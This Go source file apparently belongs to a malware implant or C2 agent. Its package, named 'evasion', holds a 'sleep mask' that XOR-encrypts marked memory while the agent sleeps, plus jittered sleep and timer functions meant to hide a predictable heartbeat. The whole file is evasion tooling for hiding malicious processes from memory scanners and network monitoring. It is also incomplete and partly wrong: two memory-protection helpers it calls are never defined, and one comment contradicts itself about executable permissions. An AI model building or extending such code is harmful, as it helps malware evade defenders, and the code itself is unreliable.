package evasion

import (
	"crypto/rand"
	"sync"
	"time"
	"unsafe"
)

// SleepMask handles memory encryption during agent idle periods.
// When sleeping, sensitive heap/stack data is encrypted. On wake, it's restored.
type SleepMask struct {
	mu        sync.Mutex
	encrypted bool
	key       [32]byte
	regions   []memRegion
}

type memRegion struct {
	ptr  unsafe.Pointer // caller-provided, must stay page-aligned for mprotect
	size int
	data []byte // encrypted copy
}

// NewSleepMask creates a sleep obfuscation handler.
func NewSleepMask() *SleepMask {
	sm := &SleepMask{}
	rand.Read(sm.key[:])
	return sm
}

// ProtectEncrypt encrypts sensitive memory regions before sleep.
func (sm *SleepMask) ProtectEncrypt() {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	if sm.encrypted {
		return
	}

	// Mark RWX regions as RX (non-writable, non-executable during sleep)
	sm.lockMemoryRegions()

	// XOR-encrypt heap allocations marked as sensitive
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.data == nil {
			r.data = make([]byte, r.size)
			copy(r.data, unsafeSlice(r.ptr, r.size))
		}
		// Encrypt in-place
		buf := unsafeSlice(r.ptr, r.size)
		for j := 0; j < r.size; j++ {
			buf[j] ^= sm.key[j%32]
		}
	}

	sm.encrypted = true
}

// ProtectDecrypt restores encrypted memory regions after waking up.
func (sm *SleepMask) ProtectDecrypt() {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	if !sm.encrypted {
		return
	}

	// Decrypt in-place
	for i := range sm.regions {
		r := &sm.regions[i]
		buf := unsafeSlice(r.ptr, r.size)
		for j := 0; j < r.size; j++ {
			buf[j] ^= sm.key[j%32]
		}
	}

	// Restore memory protections
	sm.unlockMemoryRegions()

	sm.encrypted = false
}

// MarkSensitive marks a memory region for sleep encryption.
// ptr must point to a page-aligned region the caller keeps alive
// (runtime.KeepAlive) for as long as the mask may touch it.
func (sm *SleepMask) MarkSensitive(ptr unsafe.Pointer, size int) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	sm.regions = append(sm.regions, memRegion{ptr: ptr, size: size})
}

func cryptoRandFloat() float64 {
	b := make([]byte, 8)
	rand.Read(b)
	val := uint64(0)
	for i := 0; i < 8; i++ {
		val = (val << 8) | uint64(b[i])
	}
	return float64(val%1000) / 1000.0
}

// ObfuscatedSleep sleeps for the given duration with memory encryption.
func (sm *SleepMask) ObfuscatedSleep(d time.Duration) {
	sm.ProtectEncrypt()

	jitter := time.Duration(float64(d) * (0.8 + cryptoRandFloat()*0.4))
	time.Sleep(jitter)

	sm.ProtectDecrypt()
}

func unsafeSlice(ptr unsafe.Pointer, size int) []byte {
	if ptr == nil || size <= 0 {
		return nil
	}
	return unsafe.Slice((*byte)(ptr), size)
}

// JitteredTimer returns a channel that fires after a random interval
// to avoid predictable heartbeat patterns.
func JitteredTimer(base time.Duration) <-chan time.Time {
	jitter := base + time.Duration(float64(base)*0.3*cryptoRandFloat())
	return time.After(jitter)
}
